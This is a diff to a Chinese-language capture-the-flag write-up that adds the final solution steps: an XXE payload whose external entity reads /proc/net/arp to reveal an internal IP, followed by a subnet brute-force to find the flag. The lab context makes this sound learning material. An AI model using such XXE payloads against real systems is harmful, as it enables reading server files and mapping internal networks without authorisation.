@@ -143,5 +143,18 @@ echo $result;
 ?>
 ```
 
-但是`www`和根目录都没找到flag,看wp说要SSRF,但在buu复现不出来...
+但是`www`和根目录都没找到flag,看wp说要SSRF
 
+读取`/proc/net/arp`,得到ip`10.0.159.2`
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE ANY [
+	<!ENTITY shell SYSTEM "file:///proc/net/arp">
+]>
+<user><username>&shell;</username><password>admin</password></user>
+```
+
+爆破C段,getflag
+
+![image-20210425112554267](image-20210425112554267.png)
